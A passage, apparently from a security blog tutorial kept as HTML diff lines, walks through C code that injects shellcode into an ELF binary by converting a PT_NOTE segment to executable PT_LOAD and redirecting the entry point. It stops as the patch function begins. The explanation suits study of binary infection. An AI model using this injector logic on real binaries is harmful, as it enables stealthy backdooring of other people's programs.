+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="nf">read_file</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="n">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">write_u64_le</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">dest</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">patch</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">**</span><span class="n">shellcode</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="n">shellcode_len</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">entry_point</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">start_offset</span><span class="p">);</span>
+</span></span></code></pre></div><p>We want to open and read both an ELF binary and a shellcode file to some allocated memory buffers. Our <code>main</code> function:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Usage: %s &lt;ELF File&gt; &lt;Shellcode File&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">elf_path</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">bin_path</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Open ELF file with RW permissions
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">elf_fd</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">elf_path</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">elf_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error opening ELF file &#39;%s&#39;: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">elf_path</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Load shellcode from file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">size_t</span> <span class="n">shellcode_len</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">shellcode</span> <span class="o">=</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">bin_path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode_len</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">shellcode</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error reading shellcode file &#39;%s&#39;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">bin_path</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">elf_fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Parse ELF and program headers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">Elf64_Ehdr</span> <span class="o">*</span><span class="n">elf_header</span> <span class="o">=</span> <span class="nf">read_elf64_header</span><span class="p">(</span><span class="n">elf_fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">elf_header</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error reading ELF header</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">elf_fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Elf64_Phdr</span> <span class="o">*</span><span class="n">program_headers</span> <span class="o">=</span> <span class="nf">read_elf64_program_headers</span><span class="p">(</span><span class="n">elf_fd</span><span class="p">,</span> <span class="n">elf_header</span><span class="o">-&gt;</span><span class="n">e_phoff</span><span class="p">,</span> <span class="n">elf_header</span><span class="o">-&gt;</span><span class="n">e_phnum</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">program_headers</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error reading program headers</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">elf_fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">elf_header</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>Our call to <code>read_file</code> returns a pointer to our shellcode buffer. We get its size with <code>fread</code> and store it in <code>*length</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">// Read entire contents of a file into a dynamically allocated buffer
+</span></span></span><span class="line"><span class="cl"><span class="c1">// File length is stored in *length
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Return pointer to buffer on success, or NULL on failure
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="nf">read_file</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span> <span class="o">=</span> <span class="nf">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">&#34;rb&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error opening file &#39;%s&#39;: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">fseek</span><span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_END</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error seeking in file &#39;%s&#39;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="n">file_size</span> <span class="o">=</span> <span class="nf">ftell</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">file_size</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error getting file size for &#39;%s&#39;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">rewind</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="n">file_size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">buffer</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error allocating memory for file &#39;%s&#39;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">read_size</span> <span class="o">=</span> <span class="nf">fread</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">file_size</span><span class="p">,</span> <span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">read_size</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">size_t</span><span class="p">)</span><span class="n">file_size</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error reading file &#39;%s&#39;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="n">length</span> <span class="o">=</span> <span class="n">read_size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">buffer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>After returning from our call to <code>read_file</code> to get the shellcode buffer and length, we&rsquo;re ready to call our ELF helper functions to parse both the ELF header and its program headers. We use <code>lseek</code> and <code>SEEK_SET</code> to get the beginning of our ELF binary:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">// Read the ELF64 header from the given file descriptor
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Return a pointer to an allocated Elf64_Ehdr structure on success, or NULL on failure
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">Elf64_Ehdr</span><span class="o">*</span> <span class="nf">read_elf64_header</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error seeking to beginning of ELF file</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Elf64_Ehdr</span> <span class="o">*</span><span class="n">header</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">Elf64_Ehdr</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">header</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error allocating memory for ELF header</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">header</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Elf64_Ehdr</span><span class="p">))</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Elf64_Ehdr</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error reading ELF header</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">header</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">header</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Read ELF64 program headers from the given file descriptor at offset phoff
+</span></span></span><span class="line"><span class="cl"><span class="c1">// expecting phnum headers 
+</span></span></span><span class="line"><span class="cl"><span class="c1">// Return a pointer to an allocated array of program headers
+</span></span></span><span class="line"><span class="cl"><span class="c1">// or NULL on failure
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="n">Elf64_Phdr</span><span class="o">*</span> <span class="nf">read_elf64_program_headers</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">phoff</span><span class="p">,</span> <span class="kt">uint16_t</span> <span class="n">phnum</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">phoff</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error seeking to program headers offset</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Elf64_Phdr</span> <span class="o">*</span><span class="n">phdrs</span> <span class="o">=</span> <span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">Elf64_Phdr</span><span class="p">)</span> <span class="o">*</span> <span class="n">phnum</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">phdrs</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error allocating memory for program headers</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">size_t</span> <span class="n">total_size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">Elf64_Phdr</span><span class="p">)</span> <span class="o">*</span> <span class="n">phnum</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">phdrs</span><span class="p">,</span> <span class="n">total_size</span><span class="p">)</span> <span class="o">!=</span> <span class="p">(</span><span class="kt">ssize_t</span><span class="p">)</span><span class="n">total_size</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error reading program headers from ELF file</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">phdrs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">phdrs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>After we&rsquo;ve looped through the headers and allocated them to memmory with <code>malloc</code> we land back in <code>main</code> once more. Now we do a few important things. First we store the original <code>e_entry</code> of the ELF header in <code>original entry</code>.</p>
+<p>Then we get the file size of the target ELF binary with <code>stat</code> by accessing <code>st_size</code>. We save this physical file size offset in <code>file_offset</code>. We then generate a <code>memory_offset</code> using a high address by adding <code>0xc00000000</code> to our <code>file_offset</code>. This <code>memory_offset</code> is where we want to load our shellcode to. And it&rsquo;s where we&rsquo;re going to point our new <code>e_entry</code> to.</p>
+<p>We then call the <code>patch</code> function. It takes our shellcode, shellcode length, memory_offset, and the original entry point. This is really important because it appends some additional shellcode to our shellcode buffer and which helps us jump back to the original ELF entry point.</p>
+<p>However, this change inevitably alters our shellcode buffer and length. So after the patch function returns, we update the length <code>sc_len</code> to point to our updated <code>shellcode_len</code> before modifying the program headers. We do this so when we modify the program headers, the <code>sc_len</code> will be the correctly adjusted size.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Save the old entry point so we can jump later
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">original_entry</span> <span class="o">=</span> <span class="n">elf_header</span><span class="o">-&gt;</span><span class="n">e_entry</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Calculate offsets for patching the ELF and program headers
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">struct</span> <span class="n">stat</span> <span class="n">st</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">fstat</span><span class="p">(</span><span class="n">elf_fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;Error getting ELF file metadata: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">close</span><span class="p">(</span><span class="n">elf_fd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">elf_header</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">program_headers</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">free</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">file_offset</span> <span class="o">=</span> <span class="n">st</span><span class="p">.</span><span class="n">st_size</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">memory_offset</span> <span class="o">=</span> <span class="mh">0xc00000000ULL</span> <span class="o">+</span> <span class="n">file_offset</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Patch shellcode to jump to the original entry point after finishing
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">patch</span><span class="p">(</span><span class="o">&amp;</span><span class="n">shellcode</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">shellcode_len</span><span class="p">,</span> <span class="n">memory_offset</span><span class="p">,</span> <span class="n">original_entry</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Update sc_len to patched length
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">uint64_t</span> <span class="n">sc_len</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">shellcode_len</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Look for PT_NOTE section
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">elf_header</span><span class="o">-&gt;</span><span class="n">e_phnum</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">program_headers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">p_type</span> <span class="o">==</span> <span class="n">PT_NOTE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// Convert to a PT_LOAD section with values to load shellcode
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Found PT_NOTE section</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Changing to PT_LOAD</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">program_headers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">p_type</span> <span class="o">=</span> <span class="n">PT_LOAD</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">program_headers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">p_flags</span> <span class="o">=</span> <span class="n">PF_R</span> <span class="o">|</span> <span class="n">PF_X</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">program_headers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">p_offset</span> <span class="o">=</span> <span class="n">file_offset</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">program_headers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">p_vaddr</span> <span class="o">=</span> <span class="n">memory_offset</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">program_headers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">p_memsz</span> <span class="o">+=</span> <span class="n">sc_len</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">program_headers</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">p_filesz</span> <span class="o">+=</span> <span class="n">sc_len</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// Patch the ELF header to start at the shellcode
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">elf_header</span><span class="o">-&gt;</span><span class="n">e_entry</span> <span class="o">=</span> <span class="n">memory_offset</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Patched e_entry</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>Below is the patch function. The <code>jump_shellcode</code> array is actually a small assembly program that uses a trick to help us return to the original entry point.</p>
+<p>Remember, we call the patch function from <code>main</code> with the variables we need to patch the array to make it work. We pass our shellcode buffer, shellcode length, memory_offset (which is where our new <code>e_entry</code>  will point!), and the original entry point.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="c1">// From main, we call the patch function 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
